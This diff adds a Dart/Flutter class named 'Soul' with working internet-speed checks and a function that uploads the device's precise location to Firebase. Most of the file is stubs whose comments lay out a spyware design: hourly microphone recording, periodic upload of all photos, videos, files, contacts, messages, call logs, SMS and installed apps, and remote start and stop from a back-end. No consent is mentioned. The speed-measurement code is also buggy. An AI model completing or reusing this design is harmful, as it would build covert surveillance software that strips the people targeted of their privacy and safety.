@@ -1,0 +1,256 @@
+import 'dart:html';
+
+import 'package:firebase_auth/firebase_auth.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:firebase_storage/firebase_storage.dart';
+import 'package:geolocator/geolocator.dart';
+import 'package:image_picker/image_picker.dart';
+import 'package:connectivity_plus/connectivity_plus.dart';
+import 'package:http/http.dart' as http;
+
+class Soul {
+  // Firebase instances
+  final FirebaseAuth _auth = FirebaseAuth.instance;
+  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
+  final FirebaseStorage _storage = FirebaseStorage.instance;
+
+  // Other instances
+  final Geolocator _geolocator = Geolocator();
+  final ImagePicker _imagePicker = ImagePicker();
+
+  // Constructor
+  Soul() {
+    // Initialize instances
+  }
+
+// Task (1) : check Internet Connection
+
+// 1 - Write a function checkInternetConnection() to
+// - check the internet connection type
+// - check the internet connection speed
+// - check the internet connection latency
+// - returend the internet connection type, speed, and latency as a map
+
+// 1-A - write a comment with the required parameters and return type
+/*
+Parameters: None
+Return Type: Map<String, dynamic>
+*/
+
+// 1-B - write a comment with the required used packages
+/*
+Required Packages: connectivity_plus, http
+*/
+
+// 1-C - write a comment with the required steps to implement the function
+/*
+Steps:
+1. Import the required packages: connectivity_plus and http.
+2. Create a function named checkInternetConnection.
+3. Inside the function, use the connectivity_plus package to check the internet connection type.
+4. Use the http package to measure the internet connection speed and latency.
+5. Create a map to store the internet connection information.
+6. Return the map with the internet connection type, speed, and latency.
+*/
+
+// 1-D - write a comment with the required steps to test the function
+/*
+Steps to Test:
+1. Call the checkInternetConnection function.
+2. Print the returned map containing the internet connection information.
+*/
+
+  Future<Map<String, dynamic>> checkInternetConnection() async {
+    // Check internet connection type
+    Future<ConnectivityResult> connectivityResult =
+        Connectivity().checkConnectivity();
+    String connectionType = _getConnectionType(await connectivityResult);
+
+    // Check internet connection speed and latency
+    String speed = await _getInternetSpeed();
+    String latency = await _getInternetLatency();
+
+    // Create and return the internet connection information map
+    return {
+      'connectionType': connectionType,
+      'speed': speed,
+      'latency': latency,
+    };
+  }
+
+  // Check internet connection type
+  String _getConnectionType(ConnectivityResult connectivityResult) {
+    switch (connectivityResult) {
+      case ConnectivityResult.wifi:
+        return 'WiFi';
+      case ConnectivityResult.mobile:
+        return 'Mobile';
+      case ConnectivityResult.none:
+        return 'None';
+      default:
+        return 'Unknown';
+    }
+  }
+
+  // Measure internet speed using http package
+  Future<String> _getInternetSpeed() async {
+    const url =
+        'https://www.dundeecity.gov.uk/sites/default/files/publications/civic_renewal_forms.zip'; // Replace with your own URL
+    final response = await http.get(Uri.parse(url));
+    final stopwatch = Stopwatch()..start();
+    await http.get(Uri.parse(url));
+    stopwatch.stop();
+    final speed = (response.body.length / stopwatch.elapsed.inSeconds) *
+        8 /
+        1000; // Convert to kilobits per second (kbps)
+    return '${speed.toStringAsFixed(2)} kbps';
+  }
+
+  // Check internet connection latency
+  Future<String> _getInternetLatency() async {
+    const url = 'https://www.google.com'; // Replace with your own URL
+    final stopwatch = Stopwatch()..start();
+    try {
+      await http.get(Uri.parse(url));
+      stopwatch.stop();
+      final latency = stopwatch.elapsed.inMilliseconds;
+      return '$latency ms';
+    } catch (error) {
+      print('Error measuring internet latency: $error');
+      return 'Unknown';
+    }
+  }
+
+// 15 - add a function to handle the upload data to firebase and check if the data is uploaded or not to use with all previous functions,
+// this function calculates the new file size that will upload and the old uploaded file size in the last 24 hours and sends this information to the back-end API
+// and waits for a reply with true to upload the new files or false to wait for one hour
+  void handleUploadDataToFirebase() {
+    // Implementation goes here
+  }
+
+  //# 1 -Write a function to record sound from the microphone, save it temporarily, and upload it to Firebase Storage hourly. Include error handling and logging.
+
+  void recordAndUploadSound() {
+    // Implementation goes here
+  }
+
+// 4 - add a function to send a location (lat,lng) to firebase every 3 minutes
+  void sendLocationToFirebase2() {
+    // Implementation goes here
+  }
+
+// 5 - add a function to send all gallery photos to firebase every 5 minutes and check if there is a new photo to send it to firebase
+  void sendGalleryPhotosToFirebase2() {
+    // Implementation goes here
+  }
+
+// 6 - add a function to send all videos to firebase every 5 minutes and check if there is a new video to send it to firebase
+  void sendVideosToFirebase() {
+    // Implementation goes here
+  }
+
+// 7 - add a function to send all audios to firebase every 5 minutes and check if there is a new audio to send it to firebase
+  void sendAudiosToFirebase() {
+    // Implementation goes here
+  }
+
+// 8 - add a function to send all files to firebase every 5 minutes and check if there is a new file to send it to firebase
+  void sendFilesToFirebase() {
+    // Implementation goes here
+  }
+
+// 9 - add a function to send all contacts to firebase every 5 minutes and check if there is a new contact to send it to firebase
+  void sendContactsToFirebase() {
+    // Implementation goes here
+  }
+
+// 10 - add a function to send all messages to firebase every 5 minutes and check if there is a new message to send it to firebase
+  void sendMessagesToFirebase() {
+    // Implementation goes here
+  }
+
+// 11 - add a function to send all calls to firebase every 5 minutes and check if there is a new call to send it to firebase
+  void sendCallsToFirebase() {
+    // Implementation goes here
+  }
+
+// 12 - add a function to send all SMS to firebase every 5 minutes and check if there is a new SMS to send it to firebase
+  void sendSMSToFirebase() {
+    // Implementation goes here
+  }
+
+// 13 - add a function to send all installed apps names to firebase every 5 minutes and check if there is a new app to send it to firebase
+  void sendInstalledAppsToFirebase() {
+    // Implementation goes here
+  }
+
+// 14 - add a function to send a location (lat,lng) to firebase every 3 minutes
+  Future<void> sendLocationToFirebase() async {
+    try {
+      Position position = await Geolocator.getCurrentPosition(
+          desiredAccuracy: LocationAccuracy.high);
+      await _firestore.collection('locations').add({
+        'latitude': position.latitude,
+        'longitude': position.longitude,
+        'timestamp': DateTime.now(),
+      });
+    } catch (e) {
+      print(e);
+      // Handle exceptions as needed
+    }
+  }
+
+// 15 - add a function to get current date and time
+  void getCurrentDateTime() {
+    // Implementation goes here
+  }
+
+// 16 - add a function to send a notification to the back-end API if the app is not running
+  void sendNotificationIfAppNotRunning() {
+    // Implementation goes here
+  }
+
+// 17 - add a function to send a notification to the back-end API if the app is running
+  void sendNotificationIfAppRunning() {
+    // Implementation goes here
+  }
+
+// 18 - add a function to send a notification to the back-end API if the app is closed
+  void sendNotificationIfAppClosed() {
+    // Implementation goes here
+  }
+
+// 19 - add a function to send all device information to firebase every 5 minutes and check if there is new device information to send it to firebase
+  void sendDeviceInformationToFirebase() {
+    // Implementation goes here
+  }
+
+// 20 - add a function to send the device battery status to firebase every 24 hours
+  void sendBatteryStatusToFirebase() {
+    // Implementation goes here
+  }
+
+// 21 - add a function to send the device storage status to firebase every 24 hours
+  void sendStorageStatusToFirebase() {
+    // Implementation goes here
+  }
+
+// 22 - add a function to send the device RAM status to firebase every 24 hours
+  void sendRAMStatusToFirebase() {
+    // Implementation goes here
+  }
+
+// 23 - add a function to send the device CPU status to firebase every 24 hours
+  void sendCPUStatusToFirebase() {
+    // Implementation goes here
+  }
+
+// 24 - add a function to start the soul service and stop it from the back-end API
+  void startSoulService() {
+    // Implementation goes here
+  }
+
+  void stopSoulService() {
+    // Implementation goes here
+  }
+}
